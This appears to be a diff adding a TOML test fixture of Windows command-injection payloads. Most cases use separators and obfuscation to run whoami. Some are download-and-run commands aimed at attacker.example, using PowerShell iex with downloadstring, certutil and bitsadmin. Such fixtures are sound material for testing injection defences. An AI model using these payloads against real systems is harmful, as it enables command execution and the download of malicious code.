@@ -1,0 +1,92 @@
+schema = 1
+# Windows cmd.exe / PowerShell injection.
+
+[[case]]
+id = "amp_whoami"
+class = "cmdi"
+payload = "& whoami"
+
+[[case]]
+id = "double_amp_whoami"
+class = "cmdi"
+payload = "&& whoami"
+
+[[case]]
+id = "pipe_whoami"
+class = "cmdi"
+payload = "| whoami"
+
+[[case]]
+id = "double_pipe_whoami"
+class = "cmdi"
+payload = "|| whoami"
+
+[[case]]
+id = "newline_whoami"
+class = "cmdi"
+payload = "\r\nwhoami"
+
+[[case]]
+id = "powershell_iex"
+class = "cmdi"
+payload = "; powershell -c \"iex(new-object net.webclient).downloadstring('http://attacker.example/x.ps1')\""
+
+[[case]]
+id = "powershell_b64"
+class = "cmdi"
+payload = "; powershell -enc dwBoAG8AYQBtAGkA"
+
+[[case]]
+id = "cmd_carat_obfuscation"
+class = "cmdi"
+payload = "; w^h^o^a^m^i"
+
+[[case]]
+id = "cmd_quote_obfuscation"
+class = "cmdi"
+payload = "; \"w\"\"h\"\"o\"\"a\"\"m\"\"i\""
+
+[[case]]
+id = "cmd_paren_subshell"
+class = "cmdi"
+payload = "& (whoami)"
+
+[[case]]
+id = "cmd_for_loop"
+class = "cmdi"
+payload = "& for /F %x in ('whoami') do @echo %x"
+
+[[case]]
+id = "cmd_set_indirect"
+class = "cmdi"
+payload = "& set x=whoami&& %x%"
+
+[[case]]
+id = "cmd_call_label"
+class = "cmdi"
+payload = "& call whoami"
+
+[[case]]
+id = "cmd_start_b"
+class = "cmdi"
+payload = "& start /b whoami"
+
+[[case]]
+id = "powershell_invoke_expr"
+class = "cmdi"
+payload = "; powershell -c \"Invoke-Expression 'whoami'\""
+
+[[case]]
+id = "cmd_cscript_jscript"
+class = "cmdi"
+payload = "& cscript //E:JScript x.js"
+
+[[case]]
+id = "cmd_certutil_download"
+class = "cmdi"
+payload = "& certutil -urlcache -split -f http://attacker.example/x.exe x.exe"
+
+[[case]]
+id = "cmd_bitsadmin_download"
+class = "cmdi"
+payload = "& bitsadmin /transfer myJob /download /priority normal http://attacker.example/x.exe %APPDATA%\\x.exe"
